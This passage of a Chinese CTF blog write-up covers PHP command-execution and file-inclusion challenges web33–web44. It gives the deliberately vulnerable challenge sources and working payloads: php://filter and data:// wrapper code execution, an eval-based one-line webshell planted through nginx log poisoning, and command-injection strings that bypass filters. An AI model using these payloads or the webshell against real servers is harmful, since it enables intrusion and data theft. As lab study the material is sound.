的基础上，去掉双引号即可</p><p><strong>实验：</strong></p><p>payload1</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?c=include<span class="hljs-variable">$_GET</span>[<span class="hljs-number">1</span>]?&gt;&amp;<span class="hljs-number">1</span>=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/read=convert.base64-encode/</span>resource=flag.php<br></code></pre></td></tr></table></figure><p>payload2</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">?c=include<span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>]?&gt;<br><span class="hljs-number">1</span>=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/read=convert.base64-encode/</span>resource=flag.php<br></code></pre></td></tr></table></figure><p><strong>flag:</strong></p><p><img src="/2021/11/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/33-1.jpg"></p><h2 id="web34"><a href="#web34" class="headerlink" title="web34"></a>web34</h2><p>多过滤了 :</p><p>payload同web33</p><h2 id="web35"><a href="#web35" class="headerlink" title="web35"></a>web35</h2><p>多过滤了 = 和 &lt;</p><p>payload同web33</p><h2 id="web36"><a href="#web36" class="headerlink" title="web36"></a>web36</h2><p>过滤掉了数字，把1换成字母就可</p><h2 id="web37—-日志shell"><a href="#web37—-日志shell" class="headerlink" title="web37— 日志shell"></a>web37— 日志shell</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-09-04 00:12:34</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-09-04 05:18:55</span><br><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-comment">//flag in flag.php</span><br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&quot;/flag/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$c</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    <br>    &#125;<br>        <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>分析：</strong></p><p>​    <strong>这题考的是一个协议问题，所以介绍一下各个协议的用法</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php">file:<span class="hljs-comment">//协议</span><br>用于访问本地文件，在CTF中通常用来读取本地文件<br>示例： http:<span class="hljs-comment">//127.0.0.1/include.php?file://读取的路径</span><br>php:<span class="hljs-comment">//协议</span><br>php:<span class="hljs-comment">//访问各个输入/输出流，在CTF中经常使用的是php://filter和php://input，php://filter用于读取源码，php://input用于执行php代码</span><br>示例<span class="hljs-number">1</span>： php:<span class="hljs-comment">//filter/read=convert.base64-encode/resource=[文件名]</span><br>示例<span class="hljs-number">2</span>： http:<span class="hljs-comment">//127.0.0.1/include.php?file=php://input [POST DATA部分] <span class="hljs-meta">&lt;?php</span> phpinfo(); <span class="hljs-meta">?&gt;</span>  //现在不太能理解，先放着后面学习。</span><br>data:<span class="hljs-comment">//协议</span><br>通常可以用来执行PHP代码<br>示例<span class="hljs-number">1</span>： http:<span class="hljs-comment">//127.0.0.1/include.php?file=data://text/plain,命令<span class="hljs-meta">&lt;?php</span>%20phpinfo();<span class="hljs-meta">?&gt;</span></span><br>示例<span class="hljs-number">2</span>： http:<span class="hljs-comment">//127.0.0.1/include.php?file=data://text/plain;base64,base64编码</span><br><br>搬运的：https:<span class="hljs-comment">//www.cnblogs.com/z1ten9/p/14360476.html</span><br></code></pre></td></tr></table></figure><p><strong>实验：</strong></p><p><strong>payload1：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">?c=data:<span class="hljs-comment">//text/plain,<span class="hljs-meta">&lt;?php</span> system(&quot;ls&quot;);<span class="hljs-meta">?&gt;</span></span><br><span class="hljs-meta">&lt;?php</span> system(<span class="hljs-string">&quot;ls&quot;</span>);<span class="hljs-meta">?&gt;</span> base64形式为 PD9waHAgc3lzdGVtKCdscycpOz8+<br></code></pre></td></tr></table></figure><p><img src="/2021/11/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/37-1.jpg"></p><p>因为题目中过滤了 flag,所以使用 base64 编码可以实现绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?c=data:<span class="hljs-comment">//text/plain;base64,PD9waHAgc3lzdGVtKCd0YWMgZmxhZy5waHAnKTs/Pg==</span><br></code></pre></td></tr></table></figure><p><img src="/2021/11/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/37-2.jpg"></p><p><strong>payload2</strong></p><p>利用日志：</p><pre><code>1. 首先在 url 中添加一句话木马，让其记录到服务器中的日志文件中，此次题目的环境日志路径为：/var/log/nginx/access.log</code></pre><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?c=<span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>​    2.访问日志文件，查看是否多了一句话木马：</p><p><img src="/2021/11/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/37-3.jpg"></p><ol start="3"><li>蚁剑 or 中国菜刀 类似工具连接：但是失败了</li></ol><p><strong>flag:</strong></p><p><img src="/2021/11/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/37-4.jpg"></p><h2 id="web38—日志shell"><a href="#web38—日志shell" class="headerlink" title="web38—日志shell"></a>web38—日志shell</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-09-04 00:12:34</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-09-04 05:23:36</span><br><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-comment">//flag in flag.php</span><br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&quot;/flag|php|file/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$c</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    <br>    &#125;<br>        <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>分析：</strong></p><p>​    比较上题过滤多了 php,file</p><p>​    所以 &lt;?php 写为 &lt;?=</p><p><strong>实验：</strong></p><p><strong>payload1:</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?c=data:<span class="hljs-comment">//text/plain,<span class="hljs-meta">&lt;?=</span>system(&quot;ls&quot;);<span class="hljs-meta">?&gt;</span></span><br></code></pre></td></tr></table></figure><p><img src="/2021/11/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/38-1.jpg"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?c=data:<span class="hljs-comment">//text/plain;base64,PD89IHN5c3RlbSgidGFjIGYqIik7Pz4=</span><br></code></pre></td></tr></table></figure><p><img src="/2021/11/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/38-2.jpg"></p><h2 id="web39"><a href="#web39" class="headerlink" title="web39"></a>web39</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-09-04 00:12:34</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-09-04 06:13:21</span><br><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-comment">//flag in flag.php</span><br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&quot;/flag/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot;.php&quot;</span>);<br>    &#125;<br>        <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>分析：</strong></p><p>​    此题过滤了 flag ,然后限制了后缀不能为 php,但是使用 data:// 协议不受过滤的影响</p><p><strong>实验：</strong></p><pre><code> 1. 仍然使用 data:// 协议； ls 查看目录</code></pre><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?c=data:<span class="hljs-comment">//text/plain,<span class="hljs-meta">&lt;?php</span> system(&quot;ls&quot;);<span class="hljs-meta">?&gt;</span></span><br></code></pre></td></tr></table></figure><p>​    <img src="/2021/11/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/39-1.jpg"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// cat 所有 f开头的文件</span><br>?c=data:<span class="hljs-comment">//text/plain,<span class="hljs-meta">&lt;?php</span> system(&quot;cat f*&quot;);<span class="hljs-meta">?&gt;</span></span><br></code></pre></td></tr></table></figure><p>​    <img src="/2021/11/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/39-2.jpg"></p><h2 id="web40"><a href="#web40" class="headerlink" title="web40"></a>web40</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-09-04 00:12:34</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-09-04 06:03:36</span><br><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment">*/</span><br><br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&quot;/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>        <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>分析：</strong></p><p>​    过滤了 [0-9]数字，~，·，@, #, $, ^, &amp;, *, 中文括号（），-, =, +, {},[], : , ’ , “, 逗号, &lt; &gt;, 小数点, ./, ? ,一大堆</p><p>​    根据提示给出 payload 是使用无参数函数进行文件读取</p><p><strong>实验：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">?c=print_r(localeconv());<br><span class="hljs-comment">//localeconv() 返回包含本地数字及货币格式信息的数组其中包含小数点，正好题目过滤了小数点</span><br></code></pre></td></tr></table></figure><p><img src="/2021/11/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/40-1.jpg"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">?c=print_r(pos(localeconv()));<br><span class="hljs-comment">// pos() 获取数组中当前元素的值---&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/2021/11/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/40-2.jpg"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">?c=print_r(scandir(pos(localeconv())));<br><span class="hljs-comment">// scandir() 返回指定目录中的文件和目录的数组---&gt; 此时获取到的数组下标为 1 的为 ..</span><br></code></pre></td></tr></table></figure><p><img src="/2021/11/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/40-3.jpg"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">?c=print_r(array_reverse(scandir(pos(localeconv()))));<br><span class="hljs-comment">// array_reverse() 翻转数组--&gt;将 scandir() 获取到的数组下标 1 的变为 flag.php  </span><br></code></pre></td></tr></table></figure><p><img src="/2021/11/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/40-4.jpg"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">?c=print_r(next(array_reverse(scandir(pos(localeconv())))));<br><span class="hljs-comment">// next() 函数将内部指针指向数组中的下一个元素，并输出。即下一个 ———&gt; flag.php；如若在上一步 array_reverse() 不翻转将得到： ..</span><br></code></pre></td></tr></table></figure><p><img src="/2021/11/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/40-5.jpg"></p><p>此时已经读取到了 flag.php 那么就要将其内容显示出来： 可以使用 show_source() 或者 highlight_file() 得到flag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">?c=show_source(next(array_reverse(scandir(pos(localeconv())))));<br>?c=highlight_file(next(array_reverse(scandir(pos(localeconv())))));<br></code></pre></td></tr></table></figure><p><strong>flag:</strong></p><p><img src="/2021/11/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/40-6.jpg"></p><h2 id="web41"><a href="#web41" class="headerlink" title="web41"></a>web41</h2><h2 id="web42-—-gt-dev-null-2-gt-amp-1"><a href="#web42-—-gt-dev-null-2-gt-amp-1" class="headerlink" title="web42 — &gt;/dev/null 2&gt;&amp;1"></a>web42 — &gt;/dev/null 2&gt;&amp;1</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-09-05 20:49:30</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-09-05 20:51:55</span><br><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    system(<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>分析：</strong></p><ol><li><p>/dev/null</p><p>/dev/null 表示的是一个黑洞，通常用于丢弃不需要的数据输出，或者用于输入流的文件</p><p>/dev/null 作用是将标准输出重定向到 /dev/null 中。 /dev/null 代表Linux的空设备文件，往这个文件里面写入的内容都会丢失:”黑洞” 所以执行了 &gt;dev/null 之后，标准输出掉入黑洞不复存在。</p><ol start="2"><li> 2&gt;&amp;1</li></ol><p>重定向绑定，&amp;可以将两个输出绑定在一起。所以错误输出将和标准输出同一个文件描述。</p><p>一次 &gt;/dev/null 2&gt;&amp;1 执行后：标准输出重定向到/dev/null(黑洞)中,错误输出重用来标准输出的描述，因此也掉入了黑洞。综上所述，该条命令执行后，不会有任何显示，不会输出任何信息到控制台，也不会有任何信息输出到文件中。</p></li></ol><p>所以此题要把 &gt;/dev/null 2&gt;&amp;1 这部分内容截断:</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs llvm">?<span class="hljs-keyword">c</span><span class="hljs-operator">=</span>cat flag.php<span class="hljs-comment">;// cat可以替换为 tac，nl,more，less，uniq，tail,下面的几个 flag 同样适用</span><br>?<span class="hljs-keyword">c</span><span class="hljs-operator">=</span>cat flag.php<span class="hljs-variable">%0</span>a// <span class="hljs-variable">%0</span>a <span class="hljs-operator">=</span> 回车<br>?<span class="hljs-keyword">c</span><span class="hljs-operator">=</span>cat flag.php<span class="hljs-variable">%26</span>// <span class="hljs-variable">%26</span> <span class="hljs-operator">=</span> &amp;<br>?<span class="hljs-keyword">c</span><span class="hljs-operator">=</span>cat flag.php<span class="hljs-variable">%26</span><span class="hljs-variable">%26</span>// <span class="hljs-variable">%26</span><span class="hljs-variable">%26</span> <span class="hljs-operator">=</span> &amp;&amp;<br>?<span class="hljs-keyword">c</span><span class="hljs-operator">=</span>cat flag.php||// || <span class="hljs-operator">=</span> ||<br></code></pre></td></tr></table></figure><p><strong>flag:</strong></p><p><img src="/2021/11/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/42-1.jpg"></p><h2 id="web43"><a href="#web43" class="headerlink" title="web43"></a>web43</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-09-05 20:49:30</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-09-05 21:32:51</span><br><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&quot;/\;|cat/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        system(<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>分析：</strong></p><p>​    此题较上题，多过滤了<strong>分号(;)<strong>和</strong>cat</strong>，所以在构建payload的时候，可以不使用分号(;),cat可以使用ca’’t，或者不适用cat</p><p><strong>实验：</strong></p><p>​    payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">?c=tac flag.phh%<span class="hljs-number">0</span>a<span class="hljs-comment">//%0a = 回车</span><br>?c=tac flag.phh%<span class="hljs-number">26</span><span class="hljs-comment">// %26 = &amp;</span><br>?c=tac flag.php||<span class="hljs-comment">// || = ||</span><br><span class="hljs-comment">// 题中的 tac 还可以替换为less,more,c&#x27;&#x27;at,nl,uniq</span><br></code></pre></td></tr></table></figure><p><strong>flag:</strong></p><p><img src="/2021/11/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/43-1.jpg"></p><h2 id="web44"><a href="#web44" class="headerlink" title="web44"></a>web44</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-09-05 20:49:30</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-09-05 21:32:01</span><br><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&quot;/;|cat|flag/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        system(<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>分析：</strong></p><p>​    